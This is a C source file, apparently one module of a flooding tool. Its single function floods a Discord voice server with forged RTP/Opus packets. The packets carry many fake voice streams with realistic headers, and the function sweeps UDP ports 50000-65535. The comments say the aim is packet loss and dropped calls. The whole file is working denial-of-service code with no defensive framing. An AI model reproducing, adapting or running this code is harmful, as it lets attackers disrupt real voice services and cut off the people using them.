#define _GNU_SOURCE
#include "headers/attack_params.h"

/* Discord Voice Call flood.
 *
 * Discord voice uses WebRTC: SRTP over UDP on the voice server's port.
 * Each voice packet is an SRTP packet wrapping an Opus audio frame.
 *
 * SRTP header layout (same as RTP, RFC 3550):
 *   Byte 0:   V(2) P(1) X(1) CC(4)  → 0x80 (V=2, no padding/ext, CC=0)
 *   Byte 1:   M(1) PT(7)             → PT=120 (Discord Opus payload type)
 *   Bytes 2-3: Sequence number (big-endian, increments per packet)
 *   Bytes 4-7: Timestamp (big-endian, +960 per 20ms Opus frame @ 48kHz)
 *   Bytes 8-11: SSRC (random per "stream")
 *   Bytes 12+: Opus voice payload (20–160 bytes, random to simulate audio)
 *
 * Attack strategy:
 *   - Multiple fake SSRC "senders" (simulates many voice participants)
 *   - Sequence numbers and timestamps increment realistically
 *   - Payload sizes match real 20ms Opus frames (20–160 bytes)
 *   - Targets the exact IP:port of the Discord voice server
 *   - High volume floods the voice relay → packet loss → call drops        */

#define NUM_SSRC     16     /* simultaneous fake voice streams */
#define OPUS_PT      120    /* Discord's Opus payload type */
#define RTP_V2_NOPT  0x80   /* V=2, no padding, no extension, CC=0 */
#define TS_PER_FRAME 960    /* Opus 20ms @ 48 kHz */

void* discord_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) return NULL;

    int sndbuf = 16 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    /* Use the port the user gave, or default Discord voice port 443 (UDP).
       Discord voice relay also listens on 50000-65535 UDP.
       If port 0, we sweep the full Discord voice port range.              */
    uint16_t target_port = ntohs(params->target_addr.sin_port);
    int sweep_ports = (target_port == 0 || target_port == 1);
    if (sweep_ports) target_port = 50000;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr   = params->target_addr.sin_addr;
    dest.sin_port   = htons(target_port);

    /* Per-SSRC state: each simulates one voice participant */
    uint32_t ssrc[NUM_SSRC];
    uint16_t seq[NUM_SSRC];
    uint32_t ts[NUM_SSRC];
    for (int i = 0; i < NUM_SSRC; i++) {
        ssrc[i] = (uint32_t)(rand() & 0xFFFFFFFF);
        seq[i]  = (uint16_t)(rand() & 0xFFFF);
        ts[i]   = (uint32_t)(rand() & 0xFFFFFFFF);
    }

    /* Packet buffer: 12-byte RTP header + up to 160 bytes Opus payload */
    unsigned char pkt[12 + 160];
    pkt[0] = RTP_V2_NOPT;
    pkt[1] = OPUS_PT;      /* no marker bit */

    time_t end_time = time(NULL) + params->duration;
    uint64_t pkt_n  = 0;

    while (params->active) {
        if ((pkt_n & 8191) == 0 && time(NULL) >= end_time) break;

        /* Rotate through fake voice streams */
        int s = (int)(pkt_n % NUM_SSRC);

        /* Fill RTP header fields */
        pkt[2] = (uint8_t)(seq[s] >> 8);
        pkt[3] = (uint8_t)(seq[s] & 0xFF);
        pkt[4] = (uint8_t)(ts[s] >> 24);
        pkt[5] = (uint8_t)(ts[s] >> 16);
        pkt[6] = (uint8_t)(ts[s] >> 8);
        pkt[7] = (uint8_t)(ts[s] & 0xFF);
        pkt[8]  = (uint8_t)(ssrc[s] >> 24);
        pkt[9]  = (uint8_t)(ssrc[s] >> 16);
        pkt[10] = (uint8_t)(ssrc[s] >> 8);
        pkt[11] = (uint8_t)(ssrc[s] & 0xFF);

        /* Increment per-stream sequence and timestamp */
        seq[s]++;
        ts[s] += TS_PER_FRAME;

        /* Random Opus frame size (20–160 bytes = typical 20ms frames) */
        int opus_len = 20 + (rand() % 141);
        for (int i = 0; i < opus_len; i++)
            pkt[12 + i] = (unsigned char)(rand() & 0xFF);

        /* Sweep ports if no specific port given */
        if (sweep_ports)
            dest.sin_port = htons((uint16_t)(50000 + (pkt_n % 15535)));

        sendto(fd, pkt, 12 + opus_len, MSG_NOSIGNAL | MSG_DONTWAIT,
               (struct sockaddr*)&dest, sizeof(dest));
        pkt_n++;
    }

    close(fd);
    return NULL;
}
